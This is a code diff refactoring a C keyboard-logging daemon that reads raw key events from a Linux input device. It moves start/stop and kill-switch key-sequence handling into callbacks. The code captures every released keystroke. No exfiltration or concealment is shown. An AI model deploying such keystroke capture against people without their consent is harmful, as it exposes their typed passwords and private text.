@@ -9,29 +9,24 @@
 #include "logger.h"
 #include "error.h"
 
-struct seq {
-    unsigned short *keys;
-    unsigned short size;
-    unsigned short index;
-};
+static bool continue_logging = true;
 
-static bool has_seq_triggered(unsigned short ev_code,
-                              struct seq *seq)
+static void start_stop_callback(keylog_t *kl)
 {
-    bool seq_triggered = false;
-
-    if (ev_code == seq->keys[seq->index]) {
-        seq->index++;
-
-        if (seq->index == seq->size) {
-            seq->index = 0;
-            seq_triggered = true;
-        }
+    if (kl->logging_enabled) {
+        logger.info("Key logging enabled");
+        kl->pause(kl);
     } else {
-        seq->index = 0;
+        logger.info("Key logging disabled");
+        kl->resume(kl);
     }
+}
 
-    return seq_triggered;
+static void kill_callback(keylog_t *kl)
+{
+    logger.warn("Magic kill switch sequence pressed");
+
+    continue_logging = false;
 }
 
 void keyloggerd(cmd_args_t cmd_args)
@@ -44,28 +39,6 @@ void keyloggerd(cmd_args_t cmd_args)
                      cmd_args.keyboard_device, strerror(errno));
         return;
     }
-
-    /*
-     * Structure definition:
-     *
-     * struct input_event {
-     *    struct timeval time;
-     *    unsigned short type;
-     *    unsigned short code;
-     *    unsigned int value;
-     * }
-     */
-    struct input_event ev;
-    enum ev_value {
-        RELEASED,
-        PRESSED,
-        REPEATED,
-    };
-
-    ssize_t n;
-    keylog_t *kl;
-
-    kl = create_keylog(cmd_args);
 
     /*
      * The sequence of keys to start and stop the key logger
@@ -81,46 +54,37 @@ void keyloggerd(cmd_args_t cmd_args)
         KEY_ESC, KEY_ESC, KEY_ESC
     };
 
-    struct seq start_stop_seq = {
+    keyseq_t start_stop_seq = {
         .keys = start_stop_keys,
         .size = ARRAY_SIZE(start_stop_keys),
-        .index = 0
+        .index = 0,
+        .callback = start_stop_callback,
     };
 
-    struct seq kill_seq = {
+    keyseq_t kill_seq = {
         .keys = kill_keys,
         .size = ARRAY_SIZE(kill_keys),
-        .index = 0
+        .index = 0,
+        .callback = kill_callback,
     };
 
-    bool log_key_enabled = true;
+    keylog_t *kl;
+
+    kl = create_keylog(cmd_args);
+
+    kl->install_seq(kl, start_stop_seq);
+    kl->install_seq(kl, kill_seq);
 
     kl->open(kl);
 
-    while (1) {
-        n = read(keyboard, &ev, sizeof(ev));
+    ssize_t n;
+    struct input_event event;
+
+    while (continue_logging) {
+        n = read(keyboard, &event, sizeof(event));
 
         if (n > 0) {
-            if (ev.type == EV_KEY && ev.value == RELEASED) {
-                if (log_key_enabled) {
-                    kl->log(kl, ev);
-                }
-
-                if (has_seq_triggered(ev.code, &start_stop_seq)) {
-                    log_key_enabled = !log_key_enabled;
-
-                    if (log_key_enabled) {
-                        logger.info("Key logging enabled");
-                    } else {
-                        logger.info("Key logging disabled");
-                    }
-                }
-
-                if (has_seq_triggered(ev.code, &kill_seq)) {
-                    logger.warn("Magic kill switch sequence pressed");
-                    break;
-                }
-            }
+            kl->process_event(kl, event);
         } else {
             if (errno == EINTR) {
                 continue;
